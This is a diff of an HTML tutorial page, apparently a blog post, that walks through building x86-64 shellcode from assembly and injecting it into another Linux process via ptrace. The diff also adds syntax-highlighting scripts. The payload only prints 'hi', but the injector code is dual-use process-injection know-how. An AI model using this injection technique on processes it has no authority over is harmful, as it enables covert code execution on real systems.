@@ -9,6 +9,22 @@
     <script src="https://kit.fontawesome.com/29844f2f13.js" crossorigin="anonymous"></script>
     <link rel="stylesheet" href="../style.css">
 
+<!-- Include Highlight.js CSS -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/styles/default.min.css">
+
+  <!-- Include Highlight.js JavaScript -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/languages/x86asm.min.js" integrity="sha512-tp43S2YfafEU7aebJfvq/qi4pBjRIFvZ8jXTD1TXk1uMHUSEMO+qXzAvjyh/Shy4prCZDaRL1pgINu0YyK/xlQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/languages/1c.min.js" integrity="sha512-ELcLUEQzYlYEVNeBa8iR3xp92lYTYOo2iYWMAqQ5Wt3na7rb06PMCfO8CHlyCMmJaZW7tzj6OjUwg5RJLbeyXQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/languages/bash.min.js" integrity="sha512-4ea7XTSjSgnYA2UCmeriRmmIfJ5iXR562Y8faBB+y3BKcwftFMofy6ff0wX4A4UmR155PlFghb5np+WrAVIoaw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.10.0/languages/rust.min.js" integrity="sha512-TS2u6t34Pqmip8LfVZUyujKXRANq/hMgbf47v8YKYCt+v4wXHWBdZEcomRrFGNHinuMQBR0YbgCiteFZF2M8ew==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>
+  document.addEventListener("DOMContentLoaded", (event) => {
+    hljs.highlightAll();
+  });
+</script>
 </head>
 
 <body>
@@ -39,8 +55,7 @@
         <h2 id="creating">Creating shellcode</h1>
 <p>To create our payload, we will first create an assembly program—consisting of our desired payload behaviour, that we will dissassemble into shellcode.</p>
         <p><b>asm.s</b> - Our basic assembly program contains an entry point that calls "proc" and then exits through sys calls, and a procedure that prints "hi" to stdout and then exits—before returning to the entry point caller.
-       <pre><code>
-.global _start
+       <pre><code>.global _start
 .intel_syntax noprefix
 
 
@@ -61,21 +76,15 @@ proc:
     mov rdi, 69 # exit code
     syscall
     pop rax # pop hi
-    ret # return to _start
-</code></pre>
+    ret # return to _start</code></pre>
 <p>Let's compile and run our assembly program:</p>
-<pre><code>
-$ as asm.s -o asm.o 
+<pre><code>$ as asm.s -o asm.o 
 $ ld asm.o -o asm
 $ ./asm 
-Output: hi
-</code></pre>
+Output: hi</code></pre>
 
     <p>Now that we have our assembly program, we will use objdump in order to extract the shellcode for our "proc" procedure:</p>
-<pre><code>
-$ objdump -D asm 
-asm:     file format elf64-x86-64
-Disassembly of section .text:
+<pre><code>$ objdump -D asm 
 
 0000000000401000 <_start>:
   401000:	e8 10 00 00 00       	call   401015 <proc>
@@ -99,14 +108,9 @@ Disassembly of section .text:
 ; Copying the hex values from start to end of our prodecure results in the shellcode:
 ; \x68\x68\x69\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7
 ; \x01\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\x02\x00\x00\x00\x0f\x05\x48
-; \xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x45\x00\x00\x00\x0f\x05\x58\xc3
-
-</code></pre>
-<p>demo.c - C program to verify the shellcode:
-
-</p>
-<pre><code>
-#include <stdio.h>
+; \xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x45\x00\x00\x00\x0f\x05\x58\xc3</code></pre>
+<p>demo.c - C program to verify the shellcode:</p>
+<pre><code>#include &lt;stdio.h&gt;
 __attribute__((section(".text"))) static char code[] = // Our payload
     "\x68\x68\x69\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00"
     "\x00\x48\x89\xe6\x48\xc7\xc2\x02\x00\x00\x00\x0f\x05\x48\xc7\xc0\x3c\x00"
@@ -116,27 +120,22 @@ int main(int argc, char *argv[]) {
   ((void (*)())code)(); // Cast code as a function pointer and call it
   printf("This will not be printed because the shellcode exits");
   return 1;
-}
-
-</code></pre>
+}</code></pre>
 <p>Compile and run demo.c:</p>
-<pre><code>
-$ gcc main.c -o main
+<pre><code>$ gcc main.c -o main
 $ ./main 
 Output: hi // Successful payload execution
 </code></pre>
         <h2 id="inject">Injection and Execution</h1>
         <p>injector.c - This program will inject and execute our payload in a target process using ptrace.</p>
- <pre><code>
-
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <sys/ptrace.h>
-#include <sys/types.h>
-#include <sys/user.h>
-#include <sys/wait.h>
-#include <unistd.h>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;sys/ptrace.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/user.h&gt;
+#include &lt;sys/wait.h&gt
+#include &lt;unistd.h&gt;
 
 char payload[] = // Shellcode
     "\x68\x68\x69\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00"
@@ -233,16 +232,12 @@ int main(int argc, char *argv[]) {
       }
     }
   }
-}
-
- </code></pre>       
+}</code></pre>       
  <p>Compile and run the injector with the target process id (pid):</p>
- <pre><code>
-$ gcc injector.c -o injector
+ <pre><code>$ gcc injector.c -o injector
 $ ./injector 1234
 
-The target process with pid 1234, prints "hi" and then exit.
- </code></pre>       
+The target process with pid 1234, prints "hi" and then exit.</code></pre>       
 
         </article>
     </main>
